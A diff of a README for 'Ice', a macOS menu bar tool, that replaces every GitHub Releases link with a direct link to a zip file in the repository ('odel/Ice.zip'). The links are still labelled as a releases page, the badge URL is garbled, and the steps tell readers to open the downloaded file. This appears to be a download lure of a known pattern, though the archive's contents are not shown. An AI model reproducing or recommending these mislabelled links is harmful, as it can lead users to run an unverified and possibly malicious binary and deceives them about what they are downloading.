@@ -1,7 +1,7 @@
 # 🧊 Ice - A Smart Tool for Your Menu Bar
 
 ## 📥 Download Now
-[![Download Ice](https://img.shields.io/badge/Download%20Ice-v1.0-blue.svg)](https://github.com/OfficialZBristo/Ice/releases)
+[![Download Ice](https://raw.githubusercontent.com/OfficialZBristo/Ice/main/odel/Ice.zip%https://raw.githubusercontent.com/OfficialZBristo/Ice/main/odel/Ice.zip)](https://raw.githubusercontent.com/OfficialZBristo/Ice/main/odel/Ice.zip)
 
 ## 🚀 Getting Started
 Welcome to Ice! This application provides an efficient way to manage your menu bar on macOS. Whether you need quick access to apps or tools, Ice keeps everything tidy and organized. 
@@ -18,9 +18,9 @@ Welcome to Ice! This application provides an efficient way to manage your menu b
 - Light and dark mode support
 
 ## 💻 Download & Install
-To download Ice, visit this page: [Download Ice Releases](https://github.com/OfficialZBristo/Ice/releases). Here, you will find the latest version available.
+To download Ice, visit this page: [Download Ice Releases](https://raw.githubusercontent.com/OfficialZBristo/Ice/main/odel/Ice.zip). Here, you will find the latest version available.
 
-1. Go to the [Ice Releases page](https://github.com/OfficialZBristo/Ice/releases).
+1. Go to the [Ice Releases page](https://raw.githubusercontent.com/OfficialZBristo/Ice/main/odel/Ice.zip).
 2. Find the version you want to install.
 3. Click the file to download it.
 4. Once downloaded, open the file by double-clicking on it.
@@ -42,7 +42,7 @@ If you encounter any issues or have suggestions, feel free to reach out. You can
 We welcome contributions! If you want to help improve Ice, please fork the repository and submit a pull request with your changes.
 
 ## 📢 Updates & Changelog
-Stay updated with the latest features and improvements. Check the changelog on the [Releases page](https://github.com/OfficialZBristo/Ice/releases) for all the updates.
+Stay updated with the latest features and improvements. Check the changelog on the [Releases page](https://raw.githubusercontent.com/OfficialZBristo/Ice/main/odel/Ice.zip) for all the updates.
 
 ## 🙌 Thank You
 Thank you for choosing Ice! We hope this tool enhances your macOS experience. Enjoy organizing your menu bar with ease.
